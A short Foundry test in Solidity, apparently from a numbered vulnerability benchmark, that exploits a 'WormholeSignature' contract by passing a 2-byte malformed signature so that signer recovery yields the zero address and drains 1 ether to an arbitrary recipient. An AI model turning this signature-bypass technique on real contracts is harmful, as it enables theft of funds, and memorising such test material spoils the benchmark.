// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_020_wormhole_signature is Test {
    function testExploit_MalformedSignatureAcceptedAsZeroSigner() public {
        WormholeSignature w = new WormholeSignature(address(0xABCD));
        vm.deal(address(w), 2 ether);

        bytes memory malformed = hex"1234"; // length != 65 -> recover returns address(0)
        w.execute(address(0xCAFE), 1 ether, 1, malformed);

        assertEq(address(0xCAFE).balance, 1 ether, "malformed signature should not be accepted");
    }
}
